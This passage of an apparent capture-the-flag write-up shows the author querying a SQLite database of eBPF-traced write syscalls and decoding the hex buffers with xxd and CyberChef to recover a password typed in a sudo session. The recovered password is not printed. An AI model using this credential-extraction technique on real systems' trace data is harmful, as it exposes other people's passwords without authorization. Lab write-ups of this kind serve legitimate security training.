+<div><pre class="hljs"><code>data.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 5, database pages 4, cookie 0x5, schema 4, UTF-8, version-valid-for 5</code></pre></div>
+<div><pre class="hljs"><code>sqlite&gt; <span class="hljs-string">.tables</span>
+ebpf      metadata  stats   </code></pre></div>
+<p>It turns out eBPF stands for Extended Berkeley Packet Filter.</p>
+<div><pre class="hljs"><code>sqlite&gt; SELECT <span class="hljs-symbol">*</span> FROM ebpf;
+12628|<span class="hljs-string">140492766296199$/usr/lib/x86_64-linux-gnu/libc.so.6!__write</span>|<span class="hljs-string">nano</span>|<span class="hljs-string">nano</span>|<span class="hljs-string">6</span>|<span class="hljs-string">63158069590029</span>|<span class="hljs-string">write</span>|<span class="hljs-string">11962</span>|
+12628|<span class="hljs-string">140492766296199$/usr/lib/x86_64-linux-gnu/libc.so.6!__write</span>|<span class="hljs-string">nano</span>|<span class="hljs-string">nano</span>|<span class="hljs-string">0</span>|<span class="hljs-string">63158069590029</span>|<span class="hljs-string">write</span>|<span class="hljs-string">34855</span>|
+12628|<span class="hljs-string">140492766296199$/usr/lib/x86_64-linux-gnu/libc.so.6!__write</span>|<span class="hljs-string">nano</span>|<span class="hljs-string">nano</span>|<span class="hljs-string">0</span>|<span class="hljs-string">63158069590029</span>|<span class="hljs-string">write</span>|<span class="hljs-string">99446</span>|
+12628|<span class="hljs-string">140492766296199$/usr/lib/x86_64-linux-gnu/libc.so.6!__write</span>|<span class="hljs-string">nano</span>|<span class="hljs-string">nano</span>|<span class="hljs-string">0</span>|<span class="hljs-string">63158069590029</span>|<span class="hljs-string">write</span>|<span class="hljs-string">104356</span>|
+...</code></pre></div>
+<p><img src="/_resources/53e0dc0fba4c4f71aae60756b6159d6d.png" /></p>
+<p>We can see many blobs. Too many and that is a problem.<br />
+I had no idea how to get data from it, I tried converting it to other formats, somehow getting bpftrace on it.<br />
+I was trying to get a query to extract data and after a while and talking to chatgpt I got this:</p>
+<div><pre class="hljs"><code>.output <span class="hljs-keyword">out</span>.txt
+<span class="hljs-keyword">SELECT</span> hex(substr(arguments, <span class="hljs-number">9</span>, resultcode))
+<span class="hljs-keyword">FROM</span> ebpf
+<span class="hljs-keyword">WHERE</span> resultcode &gt; <span class="hljs-number">0</span>
+<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-type">timestamp</span>;</code></pre></div>
+<p><img src="/_resources/c5af98a56d4d41d1aef1e0cd124acda4.png" /></p>
+<p>I tried converting it from hex to text.</p>
+<div><pre class="hljs"><code>printf "%s" "$(cat hexfile.txt)" | xxd -r -p &gt; binaryfile.bin
+cat binaryfile.bin
+
+e
+�����┌─[user@parrot]─[~/Desktop]s uuddoo . //bbaacckkuupp..sshh</code></pre></div>
+<p>That’s strange. Maybe I didnt catch everything that I should, so I run procmon again, this time for longer.</p>
+<p>Meanwhile I decided to check in cyberchef if there is anything I can do with it. Running From hex got me:</p>
+<p><img src="/_resources/f0eaa8c14b56491786fcb096abb04705.png" /></p>
+<p>I tried it out and the password worked. I dont understand why my previous atempt didnt work, but at last I got the password. Took only ~4 days, good way to start with hard boxes.</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
